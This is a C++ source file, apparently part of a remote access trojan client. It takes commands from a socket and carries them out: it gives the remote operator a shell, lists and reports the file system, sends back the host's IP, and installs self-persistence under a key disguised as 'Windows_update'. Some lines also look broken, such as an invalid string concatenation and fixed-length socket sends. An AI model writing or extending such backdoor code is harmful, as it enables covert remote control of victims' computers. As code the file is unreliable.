#include "Factory_Client.h"

std::vector<std::string> split(const char* buffer)
{
	std::string s = std::string(buffer);
	std::vector<std::string> args;
	const std::string delimiter = " ";
	unsigned short pos = 0;
	auto start = 0U;
	auto end = s.find(delimiter);
	while (end != std::string::npos)
	{
		//	std::cout << s.substr(start, end - start) << std::endl;
		args.push_back(s.substr(start, end - start));
		std::cout << "Args " << args[pos] << std::endl;
		start = end + delimiter.length();
		end = s.find(delimiter, start);
	}
	args.push_back(s.substr(start, end));
	//std::cout << s.substr(start, end);
	return args;
}


Factory_Client::Factory_Client(SOCKET* sockp, const char* pbuffer) : sock(sockp),buffer(pbuffer)
{
	args = split(pbuffer);

	if (args[0] == "self_persistence")
	{
		arg_self_persistence();
	}
	else if (args[0] == "getip" && args.size() == 1)
	{
		send(*sock,Auto::get_ip().c_str(),BUFFER_LEN,0);
	}
	else if (args[0] == "ls" && args.size() == 1)
	{
		Shell::ls(sock);
	}
	else if (args[0] == "pwd" && args.size() == 1)
	{
		Shell::pwd(sock);
	}
	else if (args[0] == "shell" && args.size() >= 2)
	{
		Shell::run(sock,args[1]);
	}
	else
		send(*sock,("Command : " + buffer + " not found ...").c_str(),BUFFER_LEN,0);

}

void Factory_Client::arg_self_persistence()
{
	std::string keyname;
	if (args.size() == 2)
		keyname = args[1];
	else
		keyname = "Windows_update";

	std::wstring_convert< std::codecvt<wchar_t, char, std::mbstate_t> > conv;
	std::wstring wstr = conv.from_bytes(keyname);
	send(*sock,"Putting persistence with keyname : ",36,0);
	send(*sock, keyname.c_str(), BUFFER_LEN, 0);
	Auto::persistence(wstr.c_str());
}